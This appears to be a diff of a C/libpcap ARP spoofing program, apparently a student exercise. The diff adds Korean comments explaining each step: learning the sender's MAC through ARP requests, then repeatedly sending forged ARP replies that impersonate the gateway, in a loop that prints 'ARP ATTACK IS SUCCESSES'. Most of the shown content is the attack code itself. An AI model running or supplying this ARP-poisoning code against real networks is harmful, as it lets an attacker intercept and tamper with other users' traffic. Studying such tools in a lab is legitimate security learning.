@@ -78,7 +78,7 @@ void get_my_address(const char* interface, char* my_ip, char* my_mac) {
     }
     pclose(command_result);
 }
-
+// dev, attacker ip(my ip), attacker mac(my mac), sender ip 를 이용하여 request 요청을 보낸다.
 void Sender_mac_request(const char* dev,const char* attacker_ip ,const char* attacker_mac, const char * sender_ip){
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
@@ -104,7 +104,7 @@ void Sender_mac_request(const char* dev,const char* attacker_ip ,const char* att
 	}
 	pcap_close(handle);
 }
-
+// check_attaker_ip(my.ip), check_sender_ip(입력받은 sender.ip) 값이 아래 패킷을 통해 받아온 ip값과 같은지 비교하고 같다면 sender_mac을 저장한다.
 void get_packet(const char* check_attacker_ip, const char* check_sender_ip,char* sender_ip ,char* sender_mac){
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
@@ -116,7 +116,7 @@ void get_packet(const char* check_attacker_ip, const char* check_sender_ip,char*
 		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
 		return;
 	}
-
+	
 	while(true){
 		struct EthHdr *eth_hdr = (struct EthHdr *) packet;
 	    struct ArpHdr *arp_hdr = (struct ArpHdr *) (packet+16);
@@ -135,6 +135,7 @@ void get_packet(const char* check_attacker_ip, const char* check_sender_ip,char*
 	    sprintf(target_mac, "%02x:%02x:%02x:%02x:%02x:%02x", t_mac[0],t_mac[1],t_mac[2],t_mac[3],t_mac[4],t_mac[5]);
 	    sprintf(sender_ip, "%u.%u.%u.%u",(s_ip >> 24), (s_ip >> 16) % 0x100, (s_ip >> 8) % 0x100, s_ip % 0x100);
 	    sprintf(sender_mac, "%02x:%02x:%02x:%02x:%02x:%02x", s_mac[0],s_mac[1],s_mac[2],s_mac[3],s_mac[4],s_mac[5]);
+		//sender_ip == attacker(my.ip)와 target_ip(sender.ip) 확인하여 맞으면 리턴 아니면 반복 진행
 	    if (strcmp(check_attacker_ip,sender_ip) && strcmp(check_sender_ip,target_ip)){
 	    	return;
 	    }
@@ -206,12 +207,14 @@ int main(int argc, char* argv[]) {
     while(true){
     	for (int i =0 ; i<memory_size; i++){
     	Sender_mac_request(dev,my_address.ip, my_address.mac, Ip_group[i].sen_ip);
-	    // my_address.ip => attacker_ip; Ip_group[i].sen_ip => sender_ip ;   
+	    // my_address.ip => attacker_ip; Ip_group[i].sen_ip => i번째 입력받은 sender_ip ;
+	    // sender_address[i].ip; sender_address[i].mac => 선언한 i번째 구조체의  (현재 값은 없음 -> 함수에서 값을 받아옴)
 	    get_packet(my_address.ip, Ip_group[i].sen_ip,sender_address[i].ip, sender_address[i].mac);
 	    printf("the number of factors: %d\nget sender ip: %s\nsender_mac : %s\n", i,sender_address[i].ip, sender_address[i].mac);
+	    // dev(eth0), my_address.mac(attacker_mac); sender_address[i].ip와 mac (i번째의 sender ip와 mac) ; Ip_group[i].target_ip (입력받은 i번째 gateway의 ip)
 	    arp_reply_attack(dev,my_address.mac,sender_address[i].ip,sender_address[i].mac,Ip_group[i].target_ip);
 	    printf("ARP ATTACK IS SUCCESSES\n");
-	    sleep(1);	
+	    sleep(1);	// 연속으로 계속 실행될 경우, 패킷이 제대로 받아오지 않아 1초간 sleep 지정
     	}
     	printf("Complete parameters.\nProceed with the iteration.\n");
     }
